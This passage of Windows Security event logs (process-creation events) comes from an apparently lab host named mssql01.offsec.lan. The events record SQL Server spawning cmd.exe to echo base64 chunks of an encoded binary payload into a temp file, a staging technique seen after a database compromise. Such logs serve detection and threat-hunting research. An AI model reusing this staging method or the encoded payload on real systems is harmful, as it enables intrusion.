  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:16.295416600Z" />
      <EventRecordID>1331311</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x934</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo 9+4D1tb6Cy7CldHB6B8DaxBDJF8tM8BbCuVdwsQAjU306VXsUdT/FYRKuACTRdx1TfRQEP8VfMBrDYtdV41V3FIn6N7J/9yDxAhqh2hAQg8tP1fo3XYAAInojYUg/4X/UP8VgMBAADPJK050mUh0skiDcIuNIP+o/4tVyF/HQyQBAADRjQTlXovIweF+K4/32cHhAolLmDPAW4vlXcJMAIuVdv///9eFdLVS/wNNiUski8hfweEEK8gV99nB4QKJSygzwFuLEl2oDACLhSD//7WJSyS80MHiBCvQ99rB4gKJUyhfXjPAW/rlXcIMAJCQDpCQkJBVi+yhQAVBmoXAdSp6QASaAP+AgMBAAC/sBEE/i0WoxxJABe4AAQAAAGcAQARBAKHsBMQAXXGLTTvHAX4EuACh7ARBAF3DkJCQkJCQkJCQCFWL7ItFUYtNCGqyWugDAIZQUegZQwAAUP+IkMBA113CCACQ5e6QkJCQkJCQkJCKkFWL7ItFEFYdswxXi30Ii0ggnFDlVldRUujjPwAAgwMQhcZ1Ll+4HABrAF5dwgwAxvFB/7VfM8BeXRkMAJCQkJBV91VTi10MVot1CFeLffvOz/+JXhACiV5QdA9X/3WowQcAZolGKkh7bbWD+0RquLgQAAAsx0ZiBNIAUolGCYlGtI1GSYmrIF9eW13DkJAqkFXq7I5FCMVNDGZVEFM5XS1WxwAAAAAAnscBAAAAAIv7g8n/M8DgxwIAAPKu9xlJjdGv/zvzi/5yPKGMwUCsgzhKsykLZtsEiotR/xVoAkAAg8QI6xGheNxAADPSiheLCIoEUYPgBIXADwdPO/tzyusELPtzJVMZFWxpQA0nxASD+AF8Iz3//wAAmRz6VRBf2qRmidMmT13CxgCAPzp1Njv+czI7+3UMX14qFgAAAI8ewhQIEkcBdv8VbMFAALDEBIP4AXxOPf//ZAB/pItNEI13/2aJdisNi0UYRovevlNaUrXoWdv//4u5CIt1FKzLOZCJAovBwekC86WLyIMrA2LA86SLCl9exgQLAFtdwhRDVYvnDV0Yi1UIi8FWi3UMg+ADV8cCAACTAHQrhfZ0HIt9rAj/dRWD+AOyEPbBAnQdXxyHEQEAXgXCGPhfuBYAAABvXcIYAIuqEIXAdQW4AgBbAIt9HFe8i017UVBWUujSAAAAg8QYX9ZdwhiPkJC9kFWL7IPsJFNWi/0MM9sj81dOdfR1Bb5A9EAAigY8fA+MuQAAADyCDwSXABgAaDT0QABW/xUcwcIuixyLIYPJJDN2I8QI8q730Uk70Q+FjAAAAFb/FcjBhACJRSyNW/hpTeyNVdyJReyJXfCJTeiJVe1KBAyLSAzFGQ+EqBcQAIld/ItVHGo4EXjF2v//i/gzwIv3uQcAAF/zq4tFHItNDIt9/IkGi1EMiwRMi1UUUmoCi9BWiUks6HX9//+DZgyF23VDi0X0FMB0DVCLRRxQ&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:16.297622600Z" />
      <EventRecordID>1331312</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x13d4</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x934</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:16.568185100Z" />
      <EventRecordID>1331313</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xb3c</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo 6N3n/w6JRgSLGAiJJusxVv9DrMFA9jsUibkMdYWLNQvBQHX/KS/AdC//1pOkBYD8CgCUPuVdw4tTBMFWBIlzJItFDCBuBIveibv8Y0gugzwPAA+FW5j/Sl9e7+tbwlFdw5BVizeBOlQCAACLTThTVjP2iwGLUQSJRfSLRRBXiXXsigCJ5eOEwCF14Ilk8Il12IlV3A+EhwoAAIuHUjzHdDwqRfSFwHQtO6HccvkIfQxXiQf/VQiDxASFwA+LlAoAAItPBAF7iU3ci1VGQIlF9IoKiEj//0Wp6awKdQDjfT+LDXXBQAC4AQDQADMqJDkBiUW8/0XAiVXIiVXEiVXUxkVbIIpV+4kEiJISihdqXFL/FWgNRniDxKsz0ushi8R4wUAAM8DIB4sJigQ3g4wCO8KhmMmQAAC5rQAAAIoHPC11BjhVwI/r9DwrdQYecsRH6+o8I3UGiYXUR+sthyCuButNyEfr1jwwdQaITd9H68yhdMFAAIl9EAcIfhQzyb0Eig+z/xVowUAAg8QIM1U/EosNCcEIAH3AigeLCYoEQYPgBGeQdF0Pvg+D6TBHieQQixV0wUAA8E3ggzoBfhUzwGoEigdQ/xVo0Tr9i03gMsQI6xGheIvKQzPSiheLAIpu18XgBEzSO8J0Ig8yb48MiRKNTErQ67mJfRDHcDIBUwC56yaAPip1HosDmcNRRzvCiX0Qx0XMAQAAhn0FfJzA99iJRQuKA4ngzFTsLg+F0QAAAKF0O0AAR7hF5AEAAACJXxCDODJ+1TPJKgSKD1H/FWjBQPSDXQjC0uuQiw14wUAAM8CKB4sJigRBg+AEO2N0Tw8TD/npMEeJd5+L+HTBQACJTfCDOk5+FTPAagSKB1D/Fce1QACLTfCDxFTrEaFmwUAAM9IZe4sAigRQ0bUEhcB0JbG+h40MiUeNTErQ67uAPyp1NosDg8MERzPJO8IPnClJI8iJTfCJFRBqA2hU9EA6V/8VNMFAAIPE84XAdMWKBzxxdYf4O0frMYlVBOvbiVXuylV+69M8bHUIuAEAAB9H6xg8aHUruAIAAABN6wzomgCqAGYIM8CDxwOJmRCLVZLgwg+++YM8eA953Vm4NjPSipcEfECz3CSV6HtAAIXAViKLSwSNVfyRA1Iwyqxvw5hSjVXQUmoBUVBFcg3NAIPEGOuOg/iW9xCD+AL+C4Py6DPhZotD/OsFiwODwwSNTfyNVaxRRk3QUlFqAVCJcNjo3AwA24PJFIuPi0XkD8CWxrs4ewCLRV6eUAGB+gC2AAByarj/AQAAOUX8D4POAwAATsYGJIvm/EE7yB4x/HITc4sDAACFvHUii0sEjVU9iwNSjVUfg8MIUo1V0FJqP1FQ6HEMAAArxBjrMYP4AXQNg/hadQgPvwODwwQWBSQDQcObik38jRis+FdN0FJRaldQiUWX6EgMAACDiBSLkYtF5IXAdCezRbSNUOiB+gACAADH&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:16.570435800Z" />
      <EventRecordID>1331314</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xccc</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0xb3c</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:16.841651600Z" />
      <EventRecordID>1331315</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xa98</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo Bcz/AUgAOUX8cw9OOQbdi038QTvIiY3ncvGLRdCFwJyE/QEAAMpF+w/p1N2UAIXA0x+LUwSLA411/IPDCAGNdbpWUWoDUi8ZoUMAAINaS+sug/gtdBA1+AJ1C4PDBDPAZos2/OsFiwP1w0SNVfxSjVWsUlFqMavoU6AAAIPEFD1Ki0XkhcB0J2JF8I1I00j5AOwAAHIFuP8BgQAWdcpzD07GBu2LTfxBO8aJz/xy8YtF1IXAD4RkAu1ogD4wD4RbAgAATsYGMOlLNwAAhcB1qYtTBLYDjXX8g8MIVhp1UVZRagRSUOg1EAAAg8QY6y6DpAF0EIP4AnULg8MEM8D4i9D86wWLAwa7BI0N/FKNVaxgUWoEUOg5NgBmg8Sxi/D4ReSFoXQNi0XwH0gBgfkAAs1TcgVQ/wEAADnqhXMPTsYGMIsv/EHjyIklA3Lxi0XUhcAPgsYBAACLRdhoDQ+EuwEABItVIE5OilGIRgHGBs2LRZGD3QJYoAHlRYszg8MEhXYPpsgDAAAgReSFwHUYV/6Dyf8zwMZFF6XyrvfRSYlN/Ol3AQAAi7TwM9KUyYvGiVWWD4ajAwAAgDgAD7qaA5kAQEI70YlVmrbuxkUXIOlKAQCM3QOLReTowwjdXbSFwLgGPpsAdEW3RfCNVfxSjdet/f//Uo1k0FKLfLhQi0XUUH9FQJpQUeiiMwAAi5yLRaqDxCCFwHQ8xkX7LengAAAAi0XEhcB0CcZF+yvp0IKT+O5FPIUSD4ThAAwAxkU1INm8AAAAi2LkhYtjQLgGAAACNxZFRfCFwHUIuAEAAACJRfCdTcSNla2Nlf84A1GDwwhSUPbsCN0cJOjgBQA2i/CD7BSAJi11B8ZFeS2q6xiKRSp4wHQGxkX7K+sLi0Ughed0BFAAcSAE/oPJGzbA766LRdT3iEmFwIlN/GIiky7X/xV8EkAAg8QIhcB1EotF/MYEfy6LRfxAokX8xgQwAPTZEGI5R3UTamXt/xV8wUCEg/EIhcCiA8YARYoh+4TAdByB/vrCQABOFNtFBzvwdA0NZ/sjiA6pRfxAiUX8i0XMhcAP3AEDAACDfcCcD4X3AgAAi1Xgi/0YO4cPfukCABOAfRcwD4V+AgC2ikVfhMAPhI6pABicRXuLfQyFwHRoO2fccnZXiQf/VQjCxASbwBTmjAMAAItPBIuaQ9jckxaIEJKJRfSLVeyLTeBC5IlV7ItV/NfkhlX8jkPg0kkCAACKQoPDBIhz6o116sdF/GgAAADLRRcg6f7/9f/GkOoljXXqx+n8AQAAAMZFNSDpS///w4PDBIXAdU2LReyLS/yZiQHHY7wAAAApiVEESNn///8g+EB1aItT/ItF7MdFvAAAg9WJAukT////g/gCdRaLS/xmi1Xsx0W8AAAAAGaJEen4/v+pi0P8i03sx0UGAAAAgsoI6eT+CP+L/K2xiUUQigBQsciD+XQPh2OLAAAzwtKR&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:16.843881800Z" />
      <EventRecordID>1331316</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xddc</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0xa98</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:17.115543000Z" />
      <EventRecordID>1331317</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xb24</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo pHyqCv8klYB8QNqLA41N/ElsBI1VrFFSanhqBFDoWgyocxrEd4vwxoEXIOmb/s//iwODw3CFwA+EwADpAMxN/I1VrFFSUOhRCQAAi/CLReQptQyFwA+ErgAAAItF8ItN7jvBD7OgKQAAiUX8xkUXIOlW/v//iwODkMeFwHR/jU0tjThqUVtQ6IAIAADrvYvhg8MEhcB074sQxI2s/f//aP8eAABRUughDQA+oPCDyf+m/jNA5wVy0UnGRRcgiU1l6eX+Nv+LmIPDBIWddC+NTfyN1axgUlDoUJEAAOlqUf//IAN7wwScwHQTjQb8jVWs+VJQ6FTdAPnpTv///76gwkAAx0X8uQAAAMZwFyDphv3//4OWBDxCdQuLQwKFwHSs09+0bzwOdfGLS/yFyWgHd7RcSQTrBPTA9smNVdJSpFC+52f//4vwg8n/i/5HwPKu99FJxkUXIIns/Ols/f9J/kj0QABu7w0IAAAAxkX7AIMC4+lU/f+uxkUjsoj964116n1F5wIAXgDGjnZN6Qrm//+LfWaLRfSFwHTxO0XcchlXiXL/HkJExASQwA+F/gAAAItPBMgHiU1WilUXiBAPiUX0i03si1X8QejS7BBNckkvyp1Ng3fAixn26fgBiyv0dUoGJvyF/5RDhcB0NDvpRXInfUUIi00nUIkIIVUIg8QEhcB0hdUVAACLRQyLEItABIlF3IlV9C0Zig6ICIdLRfSLTTxBRk+JTex1vYtNioXJdFiLTcCFyZhRi1Xgi038O9GVR4XAdB+8RdxyIIt9DItFiVeJB/9VCIPEBIXAdU+LD01XBIlN9IlV3IvBik0uiBJAiUUBiz/zi1X86+FN7LFN4Ek7yolN4He5/0UQ7VUQinCECw+FXPX//4tNDHVF9F+JAYtF7F5bi+VdwhAAX16DyP9bi+VdwhAAkKJ7QAB9eHoAlXZAAE93QACNAUAAYnhABlR0QACUeEAA7+lAuft4QAA9dkAA6HNAANh6QAAAfQwMIAzGDAwMDAwMDAwMDBcMDAwMDAwM8Aw8DHkMDAzNyQwMAYQMuFUM4AwMDAwMDAxRDAyMDAxqkQyhDAwMDCMM/VoCDAMMDAwMDAwMDAwMDD0MDAwMBAwM/QwMDAwMDAwFBmYCSQwGDAwMDAcICQwMCgwLDAy2jUkAontAAIl5QN4mekAARHlAANl5QJGieUAAjHmDAPV5QABzekAAAAgICAiHMwjgCAgIOQgICAgICAgZCAgICAgICAgICAg/wggICAgIHggkCAjj6ggIR+4nCAgICHUICAgICAhjCAgBAggICAIhCOoICAh9CAgICC0CBAgICAgIQlKnCAgICAgICAgICGwICAgICAXwCAYICQh5kJCQkJCQkFWL7IPsWFbORX1XS30QjU38UItFDI1VBlGLTQhSWFB66CMBAACaTYSLORSDxBiJR/iFyYuddAbGAnLmcgFQT/9Ts8l+D4A8&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:17.117830600Z" />
      <EventRecordID>1331318</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xa54</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0xb24</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:17.389222500Z" />
      <EventRecordID>1331319</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x43c</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo ATB1Bk+chcl/9Il9EEldDIXbD4znAAAAi8srz4P5BA+PsAAAAIXbfzuAODB0BMYTLquF230u/8u4rzAViffZiU0Mi9GLPR2NAvOri8oe4QNOqot9EBHCi1UU1dgD8ItF+IldDLkBe/oAOyF8EooQiBZGQG3LSe7GnQ5GQTvPOu2LVRQ7un0iK9+ZMDAwMItgiyyL0cEvAmSGi8qD4b8Da5GqSwYwi1UURopG/1s8pw+FlwAAAP06GIXA8l8PhYwA7gBzRv/sX1GL5V3Kg/v9D41Q///uS0aJXQySEIhWDkDGui5Gg/8BfgpPigiIDjJ+T3X3xuplRrjbfb7328YGLXkDxgYrc8O5ZAAAMqP3+UaFwIv6fgUEMIgGRovDuQreAABi9/mFGyfKfs64Z2ZmZvfvwfoCi8LB1h8D0J3CMIgjTIDqMIgO6Rb//9uLwsYGANnQi+VdHZCQVYvsi0Uci00Yi/0UUItFEGoBUYtNDFKLVQhQUVLoDgDupYPEHF3DkJCQkJCQkOIkVYvsg+wUg30QT3wHx0UQXAAAAN1GCNwdMNxAAItNGFOLXfdWM/YMA+CJdfyJMfbEBYv7Yg7dRQjZ4N1dCMcBAQBfACFNDItVCH/j7FBRUiEVGMFAAN1dCN1F7NwdMMIRAIPEDN/g9sREe3KNc1A7PXZYFEXs3B0wwkAAWeD2xERMSFDd7NwNEMNAAI3m7N+D7AjdHCT/FRjBQAC1XfTdRfTcBQjDQACDxAxO3A0Aw0A36No1AADqNp+xMCrIiA6LTfxB5PMtTfx3qI1D9zvw2qyKFogXR0Y78HIG61DdRQjcHXfCUADf4CUZQQAAdcHdx33cDa/CQADdVawXwNwdKPucAIng9sTkeiHdVeMuDfjCQEsL2cDcHSjCQADf4PbEBXum3V30iVz86wLdUotY9Y00GItFHIXAdW0DdfwdTRTF83Pri0UQiPfYiQHGAwCLKV5b+uXuwyEb/GT+iRF3PN1FCI3XUDv4czBPDfjCQACNY/RQg+wIvv8k/xUYwZkA3UVGg4AM6AU1AACLTRSLXcsEMIgHRzv+dsndZyZTUCuncg2YxkNPAIvwXltGxV3DghZ8bYC9bIBOOYgWfs6LVRE7gsYGPMYFTv5s677GBjGLzkeF0on6dQg7w3YDxgA2QGM+MH8zxgBEX4vDXluL5dPDkJCQkJCQkJBjkJCQkJBVi+yLRQyLMUVTVleLfRSrwPL3dDOLRRDHAAAWAADrEov9EDPAhckPnMCFYokCdAL32arNzMzMs41R4cHqA4rCTpjrS8iAwWycDgukhdJ1LYtFGDX+iTiWxl9eW13DkJBVi+yLRQyLVRDGi112V4v0GIXAdw1y9IP7/3cEbcl1IWpnFzR8CIH7////aHcqCfj/fLR/CIH7AACtgHIbhcmOG4ueHF9VFFBXUmRT6ML/He+DxMhfWyLDhcl0C+9NFMcBAJ8m3iwjhcB/&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:17.391663800Z" />
      <EventRecordID>1331320</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xefc</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x43c</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
